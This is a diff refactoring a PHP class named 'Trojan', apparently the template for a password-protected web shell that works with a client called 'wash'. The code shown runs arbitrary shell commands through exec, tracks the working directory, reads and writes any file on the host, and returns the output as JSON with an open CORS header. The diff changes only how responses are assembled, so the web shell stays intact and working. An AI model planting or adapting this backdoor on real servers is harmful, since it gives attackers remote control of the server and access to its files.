@@ -14,10 +14,6 @@ class Trojan{
     public function __construct(){
         # emulate cwd persistence
         $this->cwd = (isset($_SESSION['cwd'])) ? $_SESSION['cwd'] : trim(`pwd`);
-
-        # require that a context always be set
-        # @todo: do I need this?
-        $this->response['prompt_context'] = $this->get_prompt_context();
     }
 
     /**
@@ -44,7 +40,6 @@ class Trojan{
                 $this->response = array(
                     'error'          => "{$json['action']} unsupported.",
                     'output'         => "{$json['action']} unsupported.",
-                    'prompt_context' => $this->get_prompt_context(),
                 );
                 $this->send_response();
             }
@@ -70,11 +65,8 @@ class Trojan{
         exec($command, $output_raw);
 
         # buffer the results
-        $this->cwd      = array_pop($output_raw);
-        $this->response = array(
-            'output'         => join($output_raw, "\n"),
-            'prompt_context' => $this->get_prompt_context(),
-        );
+        $this->cwd                = array_pop($output_raw);
+        $this->response['output'] = join($output_raw, "\n");
 
         # save the cwd
         $_SESSION['cwd'] = $this->cwd;
@@ -89,6 +81,7 @@ class Trojan{
     private function send_response(){
         /* This header prevents the wash client from malfunctioning due to the 
          * Same-Origin Policy. @see: http://enable-cors.org/ */
+        $this->response['prompt_context'] = $this->get_prompt_context();
         header('Access-Control-Allow-Origin: *');
 
         # assemble and send a JSON-encoded response
@@ -143,41 +136,24 @@ class Trojan{
 
         # Verify that file is readable. 
         if(!is_readable($args['file'])){
-            $this->response = array(
-                'error'          => 'File is not readable or does not exist.',
-                'prompt_context' => $this->get_prompt_context(),
+            $this->response['error'] = 'File is not readable or does not exist.';
+        } else {
+            # double-up on the output here
+            $output = array(
+                # echo back the contents of the file
+                'output' => file_get_contents($args['file']),
+                # also pass back the absolute path to the file being read
+                'file'   => realpath($args['file']),
             );
-            $this->send_response();
+            $this->response['output'] = $output;
         }
-
-        # double-up on the output here
-        $output = array(
-            # echo back the contents of the file
-            'output' => file_get_contents($args['file']),
-            # also pass back the absolute path to the file being read
-            'file'   => realpath($args['file']),
-        );
-        $this->response = array(
-            'output'         => $output,
-            'prompt_context' => $this->get_prompt_context(),
-        );
         $this->send_response();
     }
 
     /**
      * Uploads files to the target server
      */
-    public function payload_file_up($args){
-        $out = json_encode($_FILES);
-
-        # assemble a response
-        $this->response = array(
-            'output'         => $out,
-            'prompt_context' => $this->get_prompt_context(),
-        );
-
-        $this->send_response();
-    }
+    //public function payload_file_up($args){ }
 
     /**
      * Writes a file to the server
@@ -188,13 +164,12 @@ class Trojan{
 
         # Attempt to write the file, and notify the user of the result. Again,
         # I'm combining several error checks here just to keep the trojan small.
-        if(file_put_contents($args['file'], $args['data']) === false){
+        if(!file_put_contents($args['file'], $args['data'])){
             $this->response['error'] = 'Failed. File may not be writable, or may not exist.';
         }
         else {
             $this->response['output'] = 'Write successful.';
         }
-        $this->response['prompt_context'] = $this->get_prompt_context();
         $this->send_response();
     }
 
@@ -232,10 +207,5 @@ if(sha1($_REQUEST['args']['password'] . '<%= locks[:one][:salt] %>') === '<%= lo
 
 # otherwise, just spit back an error message
 else { 
-    die(json_encode(
-        array(
-            'error'          => 'Invalid password.',
-            //'prompt_context' => 'wash>',
-        )
-    ));
+    die(json_encode( array( 'error' => 'Invalid password.' )));
 }
